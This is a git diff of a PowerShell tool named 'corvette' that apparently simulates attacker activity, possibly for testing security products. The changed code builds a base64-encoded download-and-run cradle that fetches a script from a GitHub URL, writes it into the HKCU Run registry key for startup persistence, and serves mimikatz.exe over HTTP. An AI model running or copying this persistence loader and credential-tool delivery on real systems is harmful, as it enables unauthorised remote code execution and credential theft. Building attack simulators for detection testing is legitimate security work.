@@ -1,6 +1,5 @@
-
 Set-Variable -Scope script -Name PATTERN_IPV4_ADDR -Option Constant -Value "^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$"
-Set-Variable -Scope script -Name CORVETTE_DYNAMIC_LOADER -Option Constant -Value "JgAgACgAWwBTAGMAcgBpAHAAdABCAGwAbwBjAGsAXQA6ADoAQwByAGUAYQB0AGUAKABbAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAXQA6ADoATgBlAHcAKAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAHMAcABlAGEAcgBtAGkAbgAxADAALwBjAG8AcgB2AGUAdAB0AGUALwBiAGwAbwBiAC8AbQBhAGkAbgAvAGMAbwByAHYAZQB0AHQAZQAuAHAAcwAxAD8AcgBhAHcAPQB0AHIAdQBlACcAKQApACkA"
+
 
 function IsFile (
     [string]$path
@@ -280,6 +279,13 @@ function HexDigestSha256 (
     return $sha256.ToLower()
 }
 
+function EncodeUrlPath (
+    [string]$path
+) {
+    #return [System.Web.HttpUtility]::UrlPathEncode($path)
+    return [Uri]::EscapeUriString($path)
+}
+
 function ParseNumber (
     [string]$val
 ) {
@@ -440,6 +446,11 @@ $null = [System.Console]::ReadKey()
     $script = $script.Replace("@@@epilogue_script@@@", $epilogue_script)
     
     StartEncodedScript $script
+}
+
+function GetEncodedCorvetteDynamicLoaderScript () {
+    $script = "& ([ScriptBlock]::Create([Net.WebClient]::New().DownloadString('https://github.com/spearmin10/corvette/blob/main/corvette.ps1?raw=true')))"
+    return [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($script))
 }
 
 function CleanupHome (
@@ -2301,11 +2312,15 @@ class IptgenHttpFileDownload : IptgenBase {
         [string]$client_ip,
         [string]$server_ip
     ) {
+        $request_path = ReadInput "Request Path" "/corvette.ps1" @("^.+$")
+        if (!$request_path.StartsWith("/")) {
+            $request_path = "/" + $request_path
+        }
         $this.DownloadFile(
             $interface,
             $client_ip,
             $server_ip,
-            "/corvette.ps1",
+            $(EncodeUrlPath $request_path),
             "text/plain; charset=utf-8",
             [Text.Encoding]::UTF8.GetBytes($this.props.my_script)
         )
@@ -2316,13 +2331,18 @@ class IptgenHttpFileDownload : IptgenBase {
         [string]$client_ip,
         [string]$server_ip
     ) {
-        $body_text = 'reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "corvette" /t REG_SZ /f /d "powershell -e ' + $script:CORVETTE_DYNAMIC_LOADER
+        $script_b64 = GetEncodedCorvetteDynamicLoaderScript
+        $body_text = 'reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "corvette" /t REG_SZ /f /d "powershell -e ' + $script_b64
 
+        $request_path = ReadInput "Request Path" "/corvette-ps.ps1" @("^.+$")
+        if (!$request_path.StartsWith("/")) {
+            $request_path = "/" + $request_path
+        }
         $this.DownloadFile(
             $interface,
             $client_ip,
             $server_ip,
-            "/corvette-ps.ps1",
+            $(EncodeUrlPath $request_path),
             "text/plain; charset=utf-8",
             [Text.Encoding]::UTF8.GetBytes($body_text)
         )
@@ -2336,12 +2356,16 @@ class IptgenHttpFileDownload : IptgenBase {
         $mimikatz_dir = [SetupTools]::New($this.props).DownloadMimikatz()
         $mimikatz_name = "mimikatz.exe"
         $mimikatz_local_path = BuildFullPath $mimikatz_dir $mimikatz_name
-        
+
+        $request_path = ReadInput "Request Path" "/$mimikatz_name" @("^.+$")
+        if (!$request_path.StartsWith("/")) {
+            $request_path = "/" + $request_path
+        }
         $this.DownloadFile(
             $interface,
             $client_ip,
             $server_ip,
-            "/" + $mimikatz_name,
+            $(EncodeUrlPath $request_path),
             "application/octet-stream",
             [IO.File]::ReadAllBytes($mimikatz_local_path)
         )
@@ -2977,20 +3001,29 @@ class RsgcliHttpFileDownload : RsgcliBase {
     }
 
     [void]DownloadCorvette([PropsRsgSvr]$rsgsvr) {
+        $request_path = ReadInput "Request Path" "/corvette.ps1" @("^.+$")
+        if (!$request_path.StartsWith("/")) {
+            $request_path = "/" + $request_path
+        }
         $this.DownloadFile(
             $rsgsvr,
-            "/corvette.ps1",
+            $(EncodeUrlPath $request_path),
             "text/plain; charset=utf-8",
             [Text.Encoding]::UTF8.GetBytes($this.props.my_script)
         )
     }
 
     [void]DownloadCorvettePersistenceScript([PropsRsgSvr]$rsgsvr) {
-        $body_text = 'reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "corvette" /t REG_SZ /f /d "powershell -e ' + $script:CORVETTE_DYNAMIC_LOADER
+        $script_b64 = GetEncodedCorvetteDynamicLoaderScript
+        $body_text = 'reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "corvette" /t REG_SZ /f /d "powershell -e ' + $script_b64
 
+        $request_path = ReadInput "Request Path" "/corvette-ps.ps1" @("^.+$")
+        if (!$request_path.StartsWith("/")) {
+            $request_path = "/" + $request_path
+        }
         $this.DownloadFile(
             $rsgsvr,
-            "/corvette-ps.ps1",
+            $(EncodeUrlPath $request_path),
             "text/plain; charset=utf-8",
             [Text.Encoding]::UTF8.GetBytes($body_text)
         )
@@ -3001,9 +3034,13 @@ class RsgcliHttpFileDownload : RsgcliBase {
         $mimikatz_name = "mimikatz.exe"
         $mimikatz_local_path = BuildFullPath $mimikatz_dir $mimikatz_name
         
+        $request_path = ReadInput "Request Path" "/$mimikatz_name" @("^.+$")
+        if (!$request_path.StartsWith("/")) {
+            $request_path = "/" + $request_path
+        }
         $this.DownloadFile(
             $rsgsvr,
-            "/" + $mimikatz_name,
+            $(EncodeUrlPath $request_path),
             "application/octet-stream",
             [IO.File]::ReadAllBytes($mimikatz_local_path)
         )
@@ -4720,8 +4757,8 @@ class HighRiskToolsAndCommands : CommandBase {
                 Remove-ItemProperty -Path $path -Name $name
             }
         } else {
-            $reg = New-ItemProperty -Force -Path $path -Name $name `
-                -Value "powershell -e $script:CORVETTE_DYNAMIC_LOADER"
+            $script_b64 = GetEncodedCorvetteDynamicLoaderScript
+            $reg = New-ItemProperty -Force -Path $path -Name $name -Value "powershell -e $script_b64"
             Write-Host "Persistence was achieved to ensure that 'corvette' runs on system startup at:`n  -> $path"
         }
     }
